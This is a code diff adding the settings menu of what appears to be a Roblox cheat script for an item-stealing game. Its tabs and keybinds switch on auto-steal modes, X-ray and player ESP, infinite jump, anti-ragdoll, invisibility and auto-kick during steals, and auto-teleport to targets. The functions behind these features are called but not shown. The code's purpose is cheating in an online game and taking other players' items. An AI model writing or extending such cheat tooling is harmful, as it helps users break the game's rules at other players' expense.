+        dot.Position = get() and UDim2.new(1,-17,0.5,-7.5) or UDim2.new(0,2,0.5,-7.5)
+        dot.BackgroundColor3 = Color3.new(1,1,1)
+        Instance.new("UICorner", dot).CornerRadius = UDim.new(1,0)
+
+        local swb = Instance.new("TextButton", sw)
+        swb.Size = UDim2.new(1,0,1,0)
+        swb.BackgroundTransparency = 1
+        swb.Text = ""
+        swb.ZIndex = 4; swb.AutoButtonColor = false
+        local function doT()
+            local ns=not get(); set(ns)
+            TweenService:Create(dot,TweenInfo.new(0.15),{Position=ns and UDim2.new(1,-17,0.5,-7.5) or UDim2.new(0,2,0.5,-7.5)}):Play()
+            TweenService:Create(sw,TweenInfo.new(0.15),{BackgroundColor3=ns and Theme.Accent1 or C().SH}):Play()
+        end
+        swb.MouseButton1Click:Connect(doT)
+        swb.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.Touch then doT() end end)
+        return row
+    end
+
+    local function makeKey(parent, lbl, get, set2, order)
+        local row = Instance.new("Frame", parent)
+        row.Size = UDim2.new(1,0,0,36)
+        row.BackgroundColor3 = C().SURF
+        row.BackgroundTransparency = 0
+        row.BorderSizePixel = 0
+        row.LayoutOrder = order
+        Instance.new("UICorner", row).CornerRadius = UDim.new(0,7)
+
+        local tl = Instance.new("TextLabel", row)
+        tl.Size = UDim2.new(1,-80,1,0)
+        tl.Position = UDim2.new(0,10,0,0)
+        tl.BackgroundTransparency = 1
+        tl.Text = lbl
+        tl.Font = Enum.Font.GothamBold
+        tl.TextSize = 12
+        tl.TextColor3 = C().TP
+        tl.TextXAlignment = Enum.TextXAlignment.Left
+
+        local kb = Instance.new("TextButton", row)
+        kb.Size = UDim2.new(0,64,0,24)
+        kb.Position = UDim2.new(1,-72,0.5,-12)
+        kb.BackgroundColor3 = C().SH
+        kb.Text = get() or "NONE"
+        kb.Font = Enum.Font.GothamBold
+        kb.TextSize = 11
+        kb.TextColor3 = Theme.Accent1
+        kb.AutoButtonColor = false
+        Instance.new("UICorner", kb).CornerRadius = UDim.new(0,5)
+        kb.MouseButton1Click:Connect(function()
+            kb.Text = "..."; kb.TextColor3 = C().TS
+            local con; con = UserInputService.InputBegan:Connect(function(inp)
+                if inp.UserInputType == Enum.UserInputType.Keyboard then
+                    set2(inp.KeyCode.Name)
+                    kb.Text = inp.KeyCode.Name
+                    kb.TextColor3 = Theme.Accent1
+                    SaveConfig(); con:Disconnect()
+                end
+            end)
+        end)
+        return row
+    end
+
+    -- ── TABS ──
+    local TABS2 = {
+        {name="Config",    id="cfg"},
+        {name="Visuals",   id="vis"},
+        {name="Movement",  id="mov"},
+        {name="TP",        id="tp"},
+        {name="UI Hide's", id="uih"},
+        {name="Invis",     id="inv"},
+        {name="Temas",     id="tem"},
+        {name="BList",     id="bl"},
+    }
+    local tBtns2 = {}
+    local tScrolls2 = {}
+    local activTab2 = "cfg"
+
+    local function switchTab2(id)
+        if not tScrolls2[id] then id = "cfg" end
+        activTab2 = id
+        if _G.BullysSettingsUI then _G.BullysSettingsUI.currentTab = id end
+        for tid, sc in pairs(tScrolls2) do sc.Visible = (tid==id) end
+        for tid, tb in pairs(tBtns2) do
+            local on = tid==id
+            tb.BackgroundColor3 = on and Theme.Accent1 or C().SURF
+            tb.BackgroundTransparency = 0
+            tb.TextColor3 = on and Color3.new(0,0,0) or C().TS
+            local s2 = tb:FindFirstChildOfClass("UIStroke")
+            if s2 then s2.Transparency = on and 1 or 0.3 end
+        end
+    end
+
+    do
+        local COLS,BTN_H,GAP=4,28,4
+        local rows = math.max(1, math.ceil(#TABS2 / COLS))
+        tabBar.Size = UDim2.new(1,-20,0, rows * BTN_H + math.max(0, rows - 1) * GAP)
+        cArea.Position = UDim2.new(0,10,0,44 + tabBar.Size.Y.Offset + 8)
+        cArea.Size = UDim2.new(1,-20,1,-(cArea.Position.Y.Offset + 10))
+        for i,td in ipairs(TABS2) do
+            local col=(i-1)%COLS; local row=math.floor((i-1)/COLS)
+            local tb=Instance.new("TextButton",tabBar)
+            tb.Size=UDim2.new(1/COLS,-(GAP*(COLS-1)/COLS),0,BTN_H)
+            tb.Position=UDim2.new(col/COLS,col==0 and 0 or GAP*(col/(COLS)),0,row*(BTN_H+GAP))
+            tb.BackgroundColor3=C().SURF; tb.BackgroundTransparency=0
+            tb.Text=td.name; tb.Font=Enum.Font.GothamBold; tb.TextSize=11
+            tb.TextColor3=C().TS; tb.BorderSizePixel=0; tb.AutoButtonColor=false; tb.LayoutOrder=i
+            Instance.new("UICorner",tb).CornerRadius=UDim.new(0,6)
+            local ts2=Instance.new("UIStroke",tb); ts2.Color=C().SH; ts2.Thickness=1; ts2.Transparency=0.3
+            tBtns2[td.id]=tb; tScrolls2[td.id]=makeScroll()
+            local tid=td.id; tb.MouseButton1Click:Connect(function() switchTab2(tid) end)
+        end
+    end
+
+    -- ── CONFIG TAB ──
+    local cS = tScrolls2["cfg"]
+    makeSec(cS, "AÇÕES RÁPIDAS", 0)
+    makeBtn(cS, "Abrir Painel Admin", 1, function()
+        local g = PlayerGui:FindFirstChild("XiAdminPanel")
+        if g then g.Enabled = not g.Enabled end
+    end)
+    makeBtn(cS, "Auto Steal Painel", 2, function()
+        local g = PlayerGui:FindFirstChild("AutoStealUI")
+        if g then g.Enabled = not g.Enabled end
+    end)
+    makeToggle(cS, "Job Joiner", function()
+        return Config.ShowJobJoiner
+    end, function(v)
+        Config.ShowJobJoiner = v
+        SaveConfig()
+        local g = PlayerGui:FindFirstChild("BullysJobJoiner")
+        if g then g.Enabled = v end
+    end, 3)
+
+    -- ─── AUTO STEAL DEFAULTS ─────────────────────────────────────────────
+    makeSec(cS, "AUTO STEAL DEFAULTS", 37)
+    do
+        local rSwitches = {}
+        local function applyDefMode(mode)
+            Config.DefaultToNearest  = (mode == "nearest")
+            Config.DefaultToHighest  = (mode == "highest")
+            Config.DefaultToPriority = (mode == "priority")
+            Config.DefaultToDisable  = (mode == "disable")
+            Config.AutoTPPriority    = (mode == "nearest" or mode == "priority")
+            SaveConfig()
+            for _id, _sw in pairs(rSwitches) do
+                local _on = (_id=="nearest"  and Config.DefaultToNearest)
+                         or (_id=="highest"  and Config.DefaultToHighest)
+                         or (_id=="priority" and Config.DefaultToPriority)
+                         or (_id=="disable"  and Config.DefaultToDisable)
+                TweenService:Create(_sw.dot, TweenInfo.new(0.15), {Position = _on and UDim2.new(1,-17,0.5,-7.5) or UDim2.new(0,2,0.5,-7.5)}):Play()
+                TweenService:Create(_sw.bg,  TweenInfo.new(0.15), {BackgroundColor3 = _on and Theme.Accent1 or Theme.SurfaceHighlight}):Play()
+            end
+        end
+        local function makeRadioSwitch(parent, label, id, order)
+            local isOn = (id=="nearest"  and Config.DefaultToNearest)
+                      or (id=="highest"  and Config.DefaultToHighest)
+                      or (id=="priority" and Config.DefaultToPriority)
+                      or (id=="disable"  and Config.DefaultToDisable)
+            local row = Instance.new("Frame", parent)
+            row.Size = UDim2.new(1,0,0,36)
+            row.BackgroundColor3 = C().SURF
+            row.BackgroundTransparency = 0
+            row.BorderSizePixel = 0
+            row.LayoutOrder = order
+            Instance.new("UICorner", row).CornerRadius = UDim.new(0,7)
+            local tl = Instance.new("TextLabel", row)
+            tl.Size = UDim2.new(1,-54,1,0)
+            tl.Position = UDim2.new(0,10,0,0)
+            tl.BackgroundTransparency = 1
+            tl.Text = label
+            tl.Font = Enum.Font.GothamBold
+            tl.TextSize = 12
+            tl.TextColor3 = C().TP
+            tl.TextXAlignment = Enum.TextXAlignment.Left
+            local sw = Instance.new("Frame", row)
+            sw.Size = UDim2.new(0,38,0,20)
+            sw.Position = UDim2.new(1,-46,0.5,-10)
+            sw.BackgroundColor3 = isOn and Theme.Accent1 or Theme.SurfaceHighlight
+            Instance.new("UICorner", sw).CornerRadius = UDim.new(1,0)
+            local dot = Instance.new("Frame", sw)
+            dot.Size = UDim2.new(0,15,0,15)
+            dot.Position = isOn and UDim2.new(1,-17,0.5,-7.5) or UDim2.new(0,2,0.5,-7.5)
+            dot.BackgroundColor3 = Color3.new(1,1,1)
+            Instance.new("UICorner", dot).CornerRadius = UDim.new(1,0)
+            local btn = Instance.new("TextButton", sw)
+            btn.Size = UDim2.new(1,0,1,0)
+            btn.BackgroundTransparency = 1
+            btn.Text = ""
+            btn.MouseButton1Click:Connect(function() applyDefMode(id) end)
+            rSwitches[id] = {bg=sw, dot=dot}
+        end
+        makeRadioSwitch(cS, "Default To Nearest",  "nearest",  38)
+        makeRadioSwitch(cS, "Default To Highest",  "highest",  39)
+        makeRadioSwitch(cS, "Default To Priority", "priority", 40)
+        makeRadioSwitch(cS, "Default Disable",     "disable",  41)
+    end
+
+    -- ─── AUTO STEAL ─────────────────────────────────────────────────────
+    makeSec(cS, "AUTO STEAL", 60)
+    do
+        local stealSwitches = {}
+        local function applyStealMode(mode)
+            -- mode: "nearest" | "highest" | "priority"
+            Config.StealNearest  = (mode == "nearest")
+            Config.StealHighest  = (mode == "highest")
+            Config.StealPriority = (mode == "priority")
+            -- also mirror onto DefaultTo so the logic persists on reload
+            Config.DefaultToNearest  = (mode == "nearest")
+            Config.DefaultToHighest  = (mode == "highest")
+            Config.DefaultToPriority = (mode == "priority")
+            Config.DefaultToDisable  = false
+            Config.AutoTPPriority    = (mode == "nearest" or mode == "priority")
+            SaveConfig()
+            for _id, _sw in pairs(stealSwitches) do
+                local _on = (_id=="nearest"  and Config.StealNearest)
+                         or (_id=="highest"  and Config.StealHighest)
+                         or (_id=="priority" and Config.StealPriority)
+                TweenService:Create(_sw.dot, TweenInfo.new(0.15), {Position = _on and UDim2.new(1,-17,0.5,-7.5) or UDim2.new(0,2,0.5,-7.5)}):Play()
+                TweenService:Create(_sw.bg,  TweenInfo.new(0.15), {BackgroundColor3 = _on and Theme.Accent1 or Theme.SurfaceHighlight}):Play()
+            end
+            ShowNotification("STEAL MODE", "Steal " .. mode:sub(1,1):upper() .. mode:sub(2) .. " ENABLED")
+        end
+        local function makeStealRadio(parent, label, id, order)
+            local isOn = (id=="nearest"  and Config.StealNearest)
+                      or (id=="highest"  and Config.StealHighest)
+                      or (id=="priority" and Config.StealPriority)
+            local row = Instance.new("Frame", parent)
+            row.Size = UDim2.new(1,0,0,36)
+            row.BackgroundColor3 = C().SURF
+            row.BackgroundTransparency = 0
+            row.BorderSizePixel = 0
+            row.LayoutOrder = order
+            Instance.new("UICorner", row).CornerRadius = UDim.new(0,7)
+            local tl = Instance.new("TextLabel", row)
+            tl.Size = UDim2.new(1,-54,1,0)
+            tl.Position = UDim2.new(0,10,0,0)
+            tl.BackgroundTransparency = 1
+            tl.Text = label
+            tl.Font = Enum.Font.GothamBold
+            tl.TextSize = 12
+            tl.TextColor3 = C().TP
+            tl.TextXAlignment = Enum.TextXAlignment.Left
+            local sw = Instance.new("Frame", row)
+            sw.Size = UDim2.new(0,38,0,20)
+            sw.Position = UDim2.new(1,-46,0.5,-10)
+            sw.BackgroundColor3 = isOn and Theme.Accent1 or Theme.SurfaceHighlight
+            Instance.new("UICorner", sw).CornerRadius = UDim.new(1,0)
+            local dot = Instance.new("Frame", sw)
+            dot.Size = UDim2.new(0,15,0,15)
+            dot.Position = isOn and UDim2.new(1,-17,0.5,-7.5) or UDim2.new(0,2,0.5,-7.5)
+            dot.BackgroundColor3 = Color3.new(1,1,1)
+            Instance.new("UICorner", dot).CornerRadius = UDim.new(1,0)
+            local btn = Instance.new("TextButton", sw)
+            btn.Size = UDim2.new(1,0,1,0)
+            btn.BackgroundTransparency = 1
+            btn.Text = ""
+            btn.MouseButton1Click:Connect(function() applyStealMode(id) end)
+            stealSwitches[id] = {bg=sw, dot=dot}
+        end
+        makeStealRadio(cS, "Steal Nearest",  "nearest",  61)
+        makeStealRadio(cS, "Steal Highest",  "highest",  62)
+        makeStealRadio(cS, "Steal Priority", "priority", 63)
+    end
+
+    -- ── VISUALS TAB ──
+    local vS = tScrolls2["vis"]
+    makeSec(vS,"ESP",1)
+    makeToggle(vS,"X-Ray Base",function() return Config.XrayEnabled end,function(v) Config.XrayEnabled=v; if v then enableXray() else disableXray() end; SaveConfig() end,11)
+    makeToggle(vS,"Player ESP",function() return Config.PlayerESP end,function(v) Config.PlayerESP=v; if playerESPToggleRef and playerESPToggleRef.setFn then playerESPToggleRef.setFn(v) end; SaveConfig() end,12)
+    makeToggle(vS,"Brainrot ESP",function() return Config.BrainrotESP end,function(v) Config.BrainrotESP=v; if espToggleRef and espToggleRef.setFn then espToggleRef.setFn(v) end; SaveConfig() end,13)
+    makeToggle(vS,"Conveyor ESP",function() return Config.ConveyorESP end,function(v) Config.ConveyorESP=v; SaveConfig() end,14)
+    makeToggle(vS,"Tracer Brainrot",function() return Config.TracerEnabled end,function(v) Config.TracerEnabled=v; SaveConfig() end,15)
+    makeToggle(vS,"Subspace Mine ESP",function() return Config.SubspaceMineESP end,function(v) Config.SubspaceMineESP=v; SaveConfig() end,17)
+    makeToggle(vS,"Stealing HUD",function() return Config.ShowStealingHUD~=false end,function(v) Config.ShowStealingHUD=v; SaveConfig(); local g=PlayerGui:FindFirstChild("XiStealingHUD"); if g then g.Enabled=v end end,18)
+    makeToggle(vS,"Steal Plot ESP",function() return Config.ShowStealingPlotESP~=false end,function(v) Config.ShowStealingPlotESP=v; SaveConfig(); local g=PlayerGui:FindFirstChild("XiStealingPlotESP"); if g then g.Enabled=v end end,19)
+    makeSec(vS,"OVERLAYS",20)
+    makeToggle(vS,"Line to Base",function() return Config.LineToBase end,function(v) Config.LineToBase=v; if not v and _G.resetPlotBeam then pcall(_G.resetPlotBeam) end; SaveConfig() end,21)
+    makeToggle(vS,"Unlock Buttons HUD",function() return Config.ShowUnlockButtonsHUD end,function(v)
+        Config.ShowUnlockButtonsHUD=v; SaveConfig()
+        local hudGui=PlayerGui:FindFirstChild("BullysStatusHUD")
+        if not hudGui then return end
+        local uc=hudGui:FindFirstChild("UnlockButtonsContainer")
+        if uc then uc.Visible=v end
+    end,22)
+    makeSec(vS,"CAMERA",30)
+    do
+        local fR=Instance.new("Frame",vS); fR.Size=UDim2.new(1,0,0,52); fR.BackgroundColor3=C().SURF; fR.BorderSizePixel=0; fR.LayoutOrder=31
+        Instance.new("UICorner",fR).CornerRadius=UDim.new(0,7)
+        local fl=Instance.new("TextLabel",fR); fl.Size=UDim2.new(0.5,0,0,18); fl.Position=UDim2.new(0,10,0,4); fl.BackgroundTransparency=1; fl.Text="FOV"; fl.Font=Enum.Font.GothamBold; fl.TextSize=12; fl.TextColor3=C().TP; fl.TextXAlignment=Enum.TextXAlignment.Left
+        local fV=Instance.new("TextLabel",fR); fV.Size=UDim2.new(0,40,0,18); fV.Position=UDim2.new(1,-48,0,4); fV.BackgroundTransparency=1; fV.Font=Enum.Font.GothamBlack; fV.TextSize=13; fV.TextColor3=Theme.Accent1; fV.TextXAlignment=Enum.TextXAlignment.Right; fV.Text=tostring(Config.FOV or 70)
+        local fbg=Instance.new("Frame",fR); fbg.Size=UDim2.new(1,-20,0,6); fbg.Position=UDim2.new(0,10,0,34); fbg.BackgroundColor3=C().SH; fbg.BorderSizePixel=0; Instance.new("UICorner",fbg).CornerRadius=UDim.new(1,0)
+        local ff=Instance.new("Frame",fbg); ff.BackgroundColor3=Theme.Accent1; ff.BorderSizePixel=0; ff.Size=UDim2.new(0,0,1,0); Instance.new("UICorner",ff).CornerRadius=UDim.new(1,0)
+        local fk=Instance.new("Frame",fbg); fk.Size=UDim2.new(0,13,0,13); fk.AnchorPoint=Vector2.new(0.5,0.5); fk.BackgroundColor3=Color3.new(1,1,1); fk.BorderSizePixel=0; Instance.new("UICorner",fk).CornerRadius=UDim.new(1,0)
+        local function updFOV(v) v=math.clamp(math.floor(v),30,180); Config.FOV=v; SaveConfig(); fV.Text=tostring(v); local p=(v-30)/150; ff.Size=UDim2.new(p,0,1,0); fk.Position=UDim2.new(p,0,0.5,0); if Workspace.CurrentCamera then Workspace.CurrentCamera.FieldOfView=v end end
+        updFOV(Config.FOV or 70)
+        local fD=false
+        fbg.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then fD=true end end)
+        UserInputService.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then fD=false end end)
+        UserInputService.InputChanged:Connect(function(i) if fD and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then updFOV(30+math.clamp((i.Position.X-fbg.AbsolutePosition.X)/fbg.AbsoluteSize.X,0,1)*150) end end)
+    end
+    makeSec(vS,"PERFORMANCE",40)
+    makeToggle(vS,"FPS Boost",function() return Config.FPSBoost end,function(v) setFPSBoost(v) end,41)
+
+    -- ── MOVEMENT TAB ──
+    local mS = tScrolls2["mov"]
+    makeSec(mS,"MOVIMENTO",1)
+    makeToggle(mS,"Infinite Jump",function() return State.infiniteJumpEnabled end,function(v) setInfiniteJump(v) end,11)
+    makeToggle(mS,"Auto Steal Speed",function() return Config.AutoStealSpeed end,function(v) Config.AutoStealSpeed=v; SaveConfig() end,12)
+    makeToggle(mS,"Auto Back",function() return Config.AutoBack end,function(v) Config.AutoBack=v; SaveConfig(); if v and _G.startAutoBack then _G.startAutoBack() elseif _G.stopAutoBack then _G.stopAutoBack() end end,14)
+    makeSec(mS,"ANTI-RAGDOLL",20)
+    makeToggle(mS,"Anti-Ragdoll V1",function() return Config.AntiRagdoll>0 end,function(v) Config.AntiRagdoll=v and 1 or 0; if v then Config.AntiRagdollV2=false; startAntiRagdollV2(false) end; startAntiRagdoll(Config.AntiRagdoll); SaveConfig() end,21)
+    makeToggle(mS,"Anti-Ragdoll V2",function() return Config.AntiRagdollV2 end,function(v) Config.AntiRagdollV2=v; if v then Config.AntiRagdoll=0; startAntiRagdoll(0); startAntiRagdollV2(true) else startAntiRagdollV2(false) end; SaveConfig() end,22)
+    makeSec(mS,"PROTECTION",25)
+    makeSec(mS,"AUTO UNLOCK",28)
+    makeToggle(mS,"Auto Unlock on Steal",function() return Config.AutoUnlockOnSteal end,function(v) Config.AutoUnlockOnSteal=v; SaveConfig() end,281)
+    makeSec(mS,"AUTOMATION",30)
+    makeToggle(mS,"Auto Invis no Steal",function() return Config.AutoInvisDuringSteal end,function(v) Config.AutoInvisDuringSteal=v; _G.AutoInvisDuringSteal=v; SaveConfig() end,31)
+    makeToggle(mS,"Auto Kick no Steal",function() return Config.AutoKickOnSteal end,function(v) if _G.setAutoKickFromSettings then _G.setAutoKickFromSettings(v) else Config.AutoKickOnSteal=v; SaveConfig() end end,32)
+    makeToggle(mS,"Anti-Bee & Disco",function() return Config.AntiBeeDisco end,function(v) Config.AntiBeeDisco=v; SaveConfig(); if v and SharedState.ANTI_BEE_DISCO then SharedState.ANTI_BEE_DISCO.Enable() elseif SharedState.ANTI_BEE_DISCO then SharedState.ANTI_BEE_DISCO.Disable() end end,34)
+    makeToggle(mS,"Limpar Error GUIs",function() return Config.CleanErrorGUIs end,function(v) Config.CleanErrorGUIs=v; SaveConfig() end,35)
+    makeSec(mS,"BINDS",40)
+    makeKey(mS,"Steal Speed",function() return Config.StealSpeedKey end,function(v) Config.StealSpeedKey=v end,41)
+    makeKey(mS,"Invis Toggle",function() return Config.InvisToggleKey end,function(v) Config.InvisToggleKey=v; _G.INVISIBLE_STEAL_KEY=Enum.KeyCode[v] or Enum.KeyCode.I end,42)
+    makeKey(mS,"Ragdoll Self",function() return Config.RagdollSelfKey ~= "" and Config.RagdollSelfKey or "NONE" end,function(v) Config.RagdollSelfKey=v; SaveConfig() end,43)
+    makeKey(mS,"Reset",function() return Config.ResetKey end,function(v) Config.ResetKey=v end,44)
+    makeKey(mS,"Menu",function() return Config.MenuKey end,function(v) Config.MenuKey=v end,46)
+    makeKey(mS,"Kick",function() return Config.KickKey ~= "" and Config.KickKey or "NONE" end,function(v) Config.KickKey=(v=="NONE" and "" or v) end,47)
+    makeKey(mS,"Click To AP",function() return Config.ClickToAPKeybind or "L" end,function(v) Config.ClickToAPKeybind=v; SaveConfig() end,48)
+    makeKey(mS,"Proximity AP",function() return Config.ProximityAPKeybind or "P" end,function(v) Config.ProximityAPKeybind=v; SaveConfig() end,49)
+    makeKey(mS,"Auto Buy Toggle Key",function() return Config.AutoBuyKey or "K" end,function(v) Config.AutoBuyKey=v; SaveConfig() end,50)
+    do
+        local rRejoin=Instance.new("Frame",mS); rRejoin.Size=UDim2.new(1,0,0,36); rRejoin.BackgroundColor3=C().SURF; rRejoin.BorderSizePixel=0; rRejoin.LayoutOrder=51; Instance.new("UICorner",rRejoin).CornerRadius=UDim.new(0,7)
+        local rl=Instance.new("TextLabel",rRejoin); rl.Size=UDim2.new(0.6,0,1,0); rl.Position=UDim2.new(0,10,0,0); rl.BackgroundTransparency=1; rl.Text="Rejoin"; rl.Font=Enum.Font.GothamBold; rl.TextSize=11; rl.TextColor3=C().TP; rl.TextXAlignment=Enum.TextXAlignment.Left
+        local rb=Instance.new("TextButton",rRejoin); rb.Size=UDim2.new(0,80,0,26); rb.Position=UDim2.new(1,-88,0.5,-13); rb.BackgroundColor3=Theme.Error; rb.Text="REJOIN"; rb.Font=Enum.Font.GothamBold; rb.TextSize=11; rb.TextColor3=Color3.new(1,1,1); rb.AutoButtonColor=false; Instance.new("UICorner",rb).CornerRadius=UDim.new(0,6)
+        rb.MouseButton1Click:Connect(function() ShowNotification("REJOIN","Reconnecting..."); task.delay(0.5,function() pcall(function() TeleportService:Teleport(game.PlaceId,LocalPlayer) end) end) end)
+    end
+
+    -- ── TP TAB ──
+    local tpS = tScrolls2["tp"]
+
+    makeSec(tpS,"AUTO TP",10)
+    makeToggle(tpS,"Auto TP on Script Load",function() return Config.TpSettings.TpOnLoad end,function(v) Config.TpSettings.TpOnLoad=v; SaveConfig() end,11)
+    do
+        local r=Instance.new("Frame",tpS); r.Size=UDim2.new(1,0,0,36); r.BackgroundColor3=C().SURF; r.BorderSizePixel=0; r.LayoutOrder=12; Instance.new("UICorner",r).CornerRadius=UDim.new(0,7)
+        local lbl=Instance.new("TextLabel",r); lbl.Size=UDim2.new(0.6,0,0,16); lbl.Position=UDim2.new(0,10,0,10); lbl.BackgroundTransparency=1; lbl.Text="Min Gen for Auto TP"; lbl.Font=Enum.Font.GothamBold; lbl.TextSize=11; lbl.TextColor3=C().TP; lbl.TextXAlignment=Enum.TextXAlignment.Left
+        local tb=Instance.new("TextBox",r); tb.Size=UDim2.new(0,110,0,24); tb.Position=UDim2.new(1,-118,0.5,-12); tb.BackgroundColor3=C().SH; tb.Text=tostring(Config.TpSettings.MinGenForTp or ""); tb.Font=Enum.Font.Gotham; tb.TextSize=11; tb.TextColor3=C().TP; tb.PlaceholderText="e.g. 5k, 1m, 1b"; tb.ClearTextOnFocus=false; Instance.new("UICorner",tb).CornerRadius=UDim.new(0,5)
+        tb.FocusLost:Connect(function() Config.TpSettings.MinGenForTp=tb.Text:gsub("%s",""); SaveConfig() end)
+    end
+
+    makeSec(tpS,"TP TOOL",19)
+    do
+        local tools={"Flying Carpet","Cupid's Wings","Santa's Sleigh","Witch's Broom"}; local sws={}
+        for idx,tn in ipairs(tools) do
+            local r=Instance.new("Frame",tpS); r.Size=UDim2.new(1,0,0,34); r.BackgroundColor3=C().SURF; r.BorderSizePixel=0; r.LayoutOrder=20+idx; Instance.new("UICorner",r).CornerRadius=UDim.new(0,7)
+            local lbl=Instance.new("TextLabel",r); lbl.Size=UDim2.new(1,-60,1,0); lbl.Position=UDim2.new(0,10,0,0); lbl.BackgroundTransparency=1; lbl.Text=tn; lbl.Font=Enum.Font.GothamBold; lbl.TextSize=11; lbl.TextColor3=C().TP; lbl.TextXAlignment=Enum.TextXAlignment.Left
+            local sw=Instance.new("TextButton",r); sw.Size=UDim2.new(0,50,0,22); sw.Position=UDim2.new(1,-58,0.5,-11); sw.Font=Enum.Font.GothamBold; sw.TextSize=11; sw.AutoButtonColor=false; Instance.new("UICorner",sw).CornerRadius=UDim.new(0,5)
+            local function ref() local on=Config.TpSettings.Tool==tn; sw.Text=on and"ON"or"OFF"; sw.BackgroundColor3=on and Theme.Accent1 or C().SH; sw.TextColor3=on and Color3.new(0,0,0) or C().TP end
+            ref(); sw.MouseButton1Click:Connect(function() Config.TpSettings.Tool=tn; SaveConfig(); for _,s in pairs(sws) do pcall(s) end end); sws[tn]=ref
+        end
+        local sRow=Instance.new("Frame",tpS); sRow.Size=UDim2.new(1,0,0,34); sRow.BackgroundColor3=C().SURF; sRow.BorderSizePixel=0; sRow.LayoutOrder=25; Instance.new("UICorner",sRow).CornerRadius=UDim.new(0,7)
+        local sl=Instance.new("TextLabel",sRow); sl.Size=UDim2.new(0.55,0,1,0); sl.Position=UDim2.new(0,10,0,0); sl.BackgroundTransparency=1; sl.Text="Teleport Delay (1=Fast)"; sl.Font=Enum.Font.GothamBold; sl.TextSize=11; sl.TextColor3=C().TP; sl.TextXAlignment=Enum.TextXAlignment.Left
+        local sCont=Instance.new("Frame",sRow); sCont.Size=UDim2.new(0,100,0,24); sCont.Position=UDim2.new(1,-108,0.5,-12); sCont.BackgroundTransparency=1
+        local sBtns={}
+        for i=1,4 do
+            local sb=Instance.new("TextButton",sCont); sb.Size=UDim2.new(0.22,0,1,0); sb.Position=UDim2.new((i-1)*0.26,0,0,0); sb.Font=Enum.Font.GothamBold; sb.TextSize=12; sb.AutoButtonColor=false; sb.Text=tostring(i); Instance.new("UICorner",sb).CornerRadius=UDim.new(0,4)
+            local function ref() for j,b in ipairs(sBtns) do local on=j==Config.TpSettings.Speed; b.BackgroundColor3=on and Theme.Accent1 or C().SH; b.TextColor3=on and Color3.new(0,0,0) or C().TP end end
+            sb.MouseButton1Click:Connect(function() Config.TpSettings.Speed=i; SaveConfig(); ref() end); table.insert(sBtns,sb)
+        end
+        task.defer(function() for j,b in ipairs(sBtns) do local on=j==(Config.TpSettings.Speed or 2); b.BackgroundColor3=on and Theme.Accent1 or C().SH; b.TextColor3=on and Color3.new(0,0,0) or C().TP end end)
+    end
+
+    makeSec(tpS,"TP AUTOMATION",30)
+    makeToggle(tpS,"Auto TP Priority Mode",function() return Config.AutoTPPriority end,function(v) Config.AutoTPPriority=v; SaveConfig() end,31)
+    makeToggle(tpS,"Auto TP on Failed Steal",function() return Config.AutoTpOnFailedSteal or false end,function(v) Config.AutoTpOnFailedSteal=v; SaveConfig() end,32)
+    makeToggle(tpS,"Auto TP Follow Target",function() return Config.AutoTPFollowTarget or false end,function(v) Config.AutoTPFollowTarget=v; SaveConfig() end,33)
+
+    makeSec(tpS,"TP KEYBINDS",40)
+    makeKey(tpS,"TP Keybind",function() return Config.TpSettings.TpKey end,function(v) Config.TpSettings.TpKey=v end,41)
+    makeKey(tpS,"Auto Clone Keybind",function() return Config.TpSettings.CloneKey end,function(v) Config.TpSettings.CloneKey=v end,42)
+    makeKey(tpS,"Carpet Speed Keybind",function() return Config.TpSettings.CarpetSpeedKey end,function(v) Config.TpSettings.CarpetSpeedKey=v end,43)
+    do
+        local csRow=Instance.new("Frame",tpS); csRow.Size=UDim2.new(1,0,0,34); csRow.BackgroundColor3=C().SURF; csRow.BorderSizePixel=0; csRow.LayoutOrder=44; Instance.new("UICorner",csRow).CornerRadius=UDim.new(0,7)
+        local csl=Instance.new("TextLabel",csRow); csl.Size=UDim2.new(0.6,0,1,0); csl.Position=UDim2.new(0,10,0,0); csl.BackgroundTransparency=1; csl.Text="Carpet Speed Status"; csl.Font=Enum.Font.GothamBold; csl.TextSize=11; csl.TextColor3=C().TP; csl.TextXAlignment=Enum.TextXAlignment.Left
+        local cslv=Instance.new("TextLabel",csRow); cslv.Size=UDim2.new(0,50,0,20); cslv.Position=UDim2.new(1,-58,0.5,-10); cslv.BackgroundTransparency=1; cslv.Font=Enum.Font.GothamBlack; cslv.TextSize=13; cslv.TextXAlignment=Enum.TextXAlignment.Right
+        task.spawn(function() while csRow and csRow.Parent do local on=State.carpetSpeedEnabled; cslv.Text=on and"ON"or"OFF"; cslv.TextColor3=on and Theme.Success or Theme.Error; task.wait(0.3) end end)
+    end
+
+
+    -- ── UI HIDE'S TAB ──
+    local uhS = tScrolls2["uih"]
+    makeSec(uhS,"HIDE UIs",1)
+    makeToggle(uhS,"Hide Admin Panel",function() return Config.HideAdminPanel end,function(v) Config.HideAdminPanel=v; SaveConfig(); local g=PlayerGui:FindFirstChild("XiAdminPanel"); if g then g.Enabled=not v end end,11)
+    makeToggle(uhS,"Hide Auto Steal",function() return Config.HideAutoSteal end,function(v) Config.HideAutoSteal=v; SaveConfig(); local g=PlayerGui:FindFirstChild("AutoStealUI"); if g then g.Enabled=not v end end,12)
+    makeToggle(uhS,"Hide Auto Buy UI",function() return Config.HideAutoBuyUI end,function(v) Config.HideAutoBuyUI=v; SaveConfig(); local g=PlayerGui:FindFirstChild("BullysAutoBuyUI"); if g then local p=g:FindFirstChild("ABPanel"); if p then p.Visible=not v end end end,13)
+    makeToggle(uhS,"Hide Status HUD",function() return Config.HideStatusHUD end,function(v) Config.HideStatusHUD=v; SaveConfig(); local g=PlayerGui:FindFirstChild("BullysStatusHUD"); if g then g.Enabled=not v end end,15)
+    makeToggle(uhS,"Mostrar Mini UI",function() return Config.ShowMiniActions end,function(v) Config.ShowMiniActions=v; SaveConfig(); local g=PlayerGui:FindFirstChild("BullysMiniActions"); if g then local mp=g:FindFirstChild("MiniPanel"); if mp then mp.Visible=v end end end,19)
+    makeToggle(uhS,"Auto Hide ao Iniciar",function() return Config.AutoHideMiniUI end,function(v) Config.AutoHideMiniUI=v; SaveConfig() end,20)
+
+    -- ── INVIS TAB ──
+    local iS = tScrolls2["inv"]
